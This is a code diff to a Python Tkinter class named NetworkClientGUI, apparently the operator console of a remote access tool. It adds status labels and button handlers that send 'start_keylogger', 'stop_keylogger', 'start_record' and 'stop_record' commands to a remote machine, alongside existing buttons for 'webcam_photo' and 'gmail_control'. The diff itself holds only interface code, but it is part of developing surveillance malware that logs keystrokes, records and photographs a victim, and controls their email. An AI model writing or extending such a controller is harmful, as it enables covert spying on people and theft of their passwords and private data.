@@ -33,6 +33,15 @@ class NetworkClientGUI:
         self.output_box = scrolledtext.ScrolledText(root, width=80, height=20)
         self.output_box.pack(padx=10, pady=10)
 
+        status_frame = tk.Frame(root)
+        status_frame.pack(pady=5)
+
+        self.keylogger_status = tk.StringVar(value="Keylogger: ❌ Off")
+        self.recording_status = tk.StringVar(value="Recording: ❌ Off")
+
+        tk.Label(status_frame, textvariable=self.keylogger_status, fg="blue", font=("Arial", 10, "bold")).pack(side=tk.LEFT, padx=20)
+        tk.Label(status_frame, textvariable=self.recording_status, fg="green", font=("Arial", 10, "bold")).pack(side=tk.LEFT, padx=20)
+
     def create_buttons(self):
         button_groups = [
             [
@@ -43,10 +52,10 @@ class NetworkClientGUI:
                 ("webcam_photo", lambda: self.send_predefined("webcam_photo")),
             ],
             [
-                ("start_keylogger", lambda: self.send_predefined("start_keylogger")),
-                ("stop_keylogger", lambda: self.send_predefined("stop_keylogger")),
-                ("start_record", lambda: self.send_predefined("start_record")),
-                ("stop_record", lambda: self.send_predefined("stop_record")),
+                ("start_keylogger", self.send_start_keylogger),
+                ("stop_keylogger", self.send_stop_keylogger),
+                ("start_record", self.send_start_record),
+                ("stop_record", self.send_stop_record),
                 ("gmail_control", lambda: self.send_predefined("gmail_control")),
             ],
             [
@@ -125,6 +134,23 @@ class NetworkClientGUI:
                 self.output_box.insert(tk.END, "Server closed the connection.\n")
         except Exception as e:
             self.output_box.insert(tk.END, f"Error receiving: {e}\n")
+
+    def send_start_keylogger(self):
+        self.send_predefined("start_keylogger")
+        self.keylogger_status.set("Keylogger: ✅ On")
+
+    def send_stop_keylogger(self):
+        self.send_predefined("stop_keylogger")
+        self.keylogger_status.set("Keylogger: ❌ Off")
+
+    def send_start_record(self):
+        self.send_predefined("start_record")
+        self.recording_status.set("Recording: 🔴 Recording")
+
+    def send_stop_record(self):
+        self.send_predefined("stop_record")
+        self.recording_status.set("Recording: ❌ Stopped")
+
 
 def simple_input(prompt):
     input_win = tk.Toplevel()
